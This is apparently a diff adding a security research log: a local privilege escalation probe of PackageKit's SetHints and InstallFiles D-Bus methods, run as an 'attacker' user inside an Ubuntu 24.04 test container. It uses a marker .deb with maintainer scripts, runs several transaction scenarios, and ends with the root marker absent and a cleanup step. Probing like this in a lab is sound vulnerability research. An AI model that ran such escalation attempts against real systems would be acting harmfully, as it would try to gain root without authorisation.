@@ -1,0 +1,157 @@
+PackageKit SetHints running-transaction probe
+target=ubuntu24-server-lpe-target attacker=attacker
+2026-05-16T13:33:06-0400
+
+$ docker exec ubuntu24-server-lpe-target bash -lc $'\nset -euo pipefail\necho "== baseline =="\ncat /etc/os-release | sed -n "1,6p"\nuname -a\nid attacker\nid selfauth || true\ndpkg-query -W -f="\\${Package}\\t\\${Version}\\t\\${Status}\\n" \\\n  packagekit packagekit-tools libpackagekit-glib2-18 gir1.2-packagekitglib-1.0 \\\n  python3-gi polkitd dbus systemd apt debconf 2>&1 || true\necho\necho "== packagekit service =="\nsystemctl cat packagekit.service\nsystemctl status packagekit.service --no-pager || true\necho\necho "== packagekit policy =="\ngrep -A4 -E "package-install|system-sources-refresh|trigger-offline-update" \\\n  /usr/share/polkit-1/actions/org.freedesktop.packagekit.policy || true\necho\necho "== cleanup before =="\nsystemctl restart packagekit.service || true\ndpkg -r packagekit-sethints-running-root 2>/dev/null || true\nrm -rf /tmp/packagekit-sethints-running /root/packagekit_sethints_running_root\n'
+== baseline ==
+PRETTY_NAME="Ubuntu 24.04.4 LTS"
+NAME="Ubuntu"
+VERSION_ID="24.04"
+VERSION="24.04.4 LTS (Noble Numbat)"
+VERSION_CODENAME=noble
+ID=ubuntu
+Linux 4f5b414436ae 6.10.14-linuxkit #1 SMP Sat May 17 08:28:57 UTC 2025 aarch64 aarch64 aarch64 GNU/Linux
+uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)
+uid=1002(selfauth) gid=1002(selfauth) groups=1002(selfauth)
+apt	2.8.3	install ok installed
+dbus	1.14.10-4ubuntu4.1	install ok installed
+debconf	1.5.86ubuntu1	install ok installed
+gir1.2-packagekitglib-1.0	1.2.8-2ubuntu1.5	install ok installed
+libpackagekit-glib2-18	1.2.8-2ubuntu1.5	install ok installed
+packagekit	1.2.8-2ubuntu1.5	install ok installed
+packagekit-tools	1.2.8-2ubuntu1.5	install ok installed
+polkitd	124-2ubuntu1.24.04.3	install ok installed
+python3-gi	3.48.2-1	install ok installed
+systemd	255.4-1ubuntu8.15	install ok installed
+
+== packagekit service ==
+# /usr/lib/systemd/system/packagekit.service
+[Unit]
+Description=PackageKit Daemon
+# PK doesn't know how to do anything on ostree-managed systems;
+# currently the design is to have dedicated daemons like
+# eos-updater and rpm-ostree, and gnome-software talks to those.
+ConditionPathExists=!/run/ostree-booted
+Wants=network-online.target
+
+[Service]
+Type=dbus
+BusName=org.freedesktop.PackageKit
+User=root
+ExecStart=/usr/libexec/packagekitd
+○ packagekit.service - PackageKit Daemon
+     Loaded: loaded (/usr/lib/systemd/system/packagekit.service; static)
+     Active: inactive (dead)
+
+May 16 17:11:46 4f5b414436ae PackageKit[741295]: uid 1001 is trying to obtain org.freedesktop.packagekit.system-sources-refresh auth (only_trusted:0)
+May 16 17:11:46 4f5b414436ae PackageKit[741295]: uid 1001 failed to obtain auth
+May 16 17:12:43 4f5b414436ae PackageKit[741295]: uid 1002 is trying to obtain org.freedesktop.packagekit.system-sources-refresh auth (only_trusted:0)
+May 16 17:12:43 4f5b414436ae PackageKit[741295]: uid 1002 failed to obtain auth
+May 16 17:16:09 4f5b414436ae PackageKit[741295]: uid 1001 is trying to obtain org.freedesktop.packagekit.system-sources-refresh auth (only_trusted:0)
+May 16 17:16:09 4f5b414436ae PackageKit[741295]: uid 1001 failed to obtain auth
+May 16 17:16:09 4f5b414436ae PackageKit[741295]: uid 1002 is trying to obtain org.freedesktop.packagekit.system-sources-refresh auth (only_trusted:0)
+May 16 17:16:09 4f5b414436ae PackageKit[741295]: uid 1002 failed to obtain auth
+May 16 17:26:36 4f5b414436ae PackageKit[741295]: daemon quit
+May 16 17:26:36 4f5b414436ae systemd[1]: packagekit.service: Deactivated successfully.
+
+== packagekit policy ==
+  <action id="org.freedesktop.packagekit.package-install">
+    <!-- SECURITY:
+          - Normal users need authentication to install signed packages
+            from signed repositories, because otherwise the system is
+            only as secure as the least-secure package available in the
+--
+  <action id="org.freedesktop.packagekit.package-install-untrusted">
+    <!-- SECURITY:
+          - Normal users require admin authentication to install untrusted or
+            unrecognised packages, as allowing users to do this without a
+            password would be a massive security hole.
+--
+    <annotate key="org.freedesktop.policykit.imply">org.freedesktop.packagekit.package-install</annotate>
+  </action>
+  <action id="org.freedesktop.packagekit.package-reinstall">
+    <!-- SECURITY
+          - Normal users require admin authentication to reinstall packages.
+--
+    <annotate key="org.freedesktop.policykit.imply">org.freedesktop.packagekit.package-install</annotate>
+  </action>
+  <action id="org.freedesktop.packagekit.system-trust-signing-key">
+    <!-- SECURITY:
+          - Normal users require admin authentication to add signing keys.
+--
+    <annotate key="org.freedesktop.policykit.imply">org.freedesktop.packagekit.package-install</annotate>
+  </action>
+  <action id="org.freedesktop.packagekit.system-update">
+    <!-- SECURITY:
+          - Normal users do not require admin authentication to update the
+--
+  <action id="org.freedesktop.packagekit.system-sources-refresh">
+    <!-- SECURITY:
+          - Normal users do not require admin authentication to refresh the
+            cache, as this doesn't actually install or remove software.
+     -->
+--
+  <action id="org.freedesktop.packagekit.trigger-offline-update">
+    <!-- SECURITY:
+          - Normal users are able to ask updates to be installed at
+            early boot time without a password.
+     -->
+
+== cleanup before ==
+
+$ docker exec -i ubuntu24-server-lpe-target runuser -u attacker -- bash
+dpkg-deb: building package 'packagekit-sethints-running-root' in '/tmp/packagekit-sethints-running/packagekit-sethints-running-root.deb'.
+-rw-r--r-- 1 attacker attacker 1042 May 16 17:33 /tmp/packagekit-sethints-running/packagekit-sethints-running-root.deb
+ new Debian package, version 2.0.
+ size 1042 bytes: control archive=664 bytes.
+     154 bytes,     7 lines   *  config               #!/bin/sh
+     226 bytes,     7 lines      control
+     327 bytes,    12 lines   *  postinst             #!/bin/sh
+     281 bytes,     6 lines      templates
+ Package: packagekit-sethints-running-root
+ Version: 1.0
+ Section: misc
+ Priority: optional
+ Architecture: all
+ Maintainer: PackageKit Probe <root@example.invalid>
+ Description: PackageKit SetHints running transaction marker package
+
+$ docker exec -i ubuntu24-server-lpe-target runuser -u attacker -- bash
+== scenario simulate-pre flags=4 ==
+  tx=/67_dcebdccd
+  props={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
+  SetHints pre: ok ['frontend-socket=/tmp/packagekit-sethints-running/simulate-pre.sock', 'interactive=true']
+  async_reply InstallFiles flags=4: ok
+  props={'Uid': 1001, 'CallerActive': True, 'Role': 10, 'Status': 18, 'TransactionFlags': 4}
+  listener_events=[('accept_error', "OSError(9, 'Bad file descriptor')")]
+== scenario only-download-pre flags=8 ==
+  tx=/68_cbcbcbac
+  props={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
+  SetHints pre: ok ['frontend-socket=/tmp/packagekit-sethints-running/only-download-pre.sock', 'interactive=true']
+  async_reply InstallFiles flags=8: ok
+  props={'Uid': 1001, 'CallerActive': True, 'Role': 10, 'Status': 18, 'TransactionFlags': 8}
+  listener_events=[('accept_error', "OSError(9, 'Bad file descriptor')")]
+== scenario only-download-post flags=8 ==
+  tx=/69_beccaaad
+  props={'Uid': 1001, 'CallerActive': True, 'Role': 0, 'Status': 1, 'TransactionFlags': 0}
+  SetHints post-start: ok ['frontend-socket=/tmp/packagekit-sethints-running/only-download-post.sock', 'interactive=true']
+  async_reply InstallFiles flags=8: ok
+  props={'Uid': 1001, 'CallerActive': True, 'Role': 10, 'Status': 18, 'TransactionFlags': 8}
+  listener_events=[('accept_error', "OSError(9, 'Bad file descriptor')")]
+== scenario real-install-preauth-block ==
+  tx=/70_dccdaddb
+  SetHints pre: ok ['frontend-socket=/tmp/packagekit-sethints-running/real-pre.sock', 'interactive=true']
+  async_reply InstallFiles flags=0: ok
+  listener_events=[('accept_error', "OSError(9, 'Bad file descriptor')")]
+== scenario second-action-blocked ==
+  tx=/71_eccccecb
+  second InstallFiles flags=0: GDBus.Error:org.freedesktop.PackageKit.Transaction.InvalidState: cannot call InstallFiles on transaction /71_eccccecb: already in state running
+  async_reply InstallFiles flags=8: ok
+
+$ docker exec ubuntu24-server-lpe-target bash -lc $'\nset -euo pipefail\necho "== post-probe root/package state =="\nif test -e /root/packagekit_sethints_running_root; then\n  echo "ROOT_MARKER_PRESENT"\n  cat /root/packagekit_sethints_running_root\nelse\n  echo "ROOT_MARKER_ABSENT"\nfi\ndpkg-query -W -f="\\${Package}\\t\\${Version}\\t\\${Status}\\n" packagekit-sethints-running-root 2>&1 || true\necho\necho "== cleanup =="\ndpkg -r packagekit-sethints-running-root 2>/dev/null || true\nrm -rf /tmp/packagekit-sethints-running /root/packagekit_sethints_running_root\nsystemctl restart packagekit.service || true\nsystemctl is-system-running || true\nsystemctl --failed --no-legend || true\n'
+== post-probe root/package state ==
+ROOT_MARKER_ABSENT
+dpkg-query: no packages found matching packagekit-sethints-running-root
+
+== cleanup ==
+running
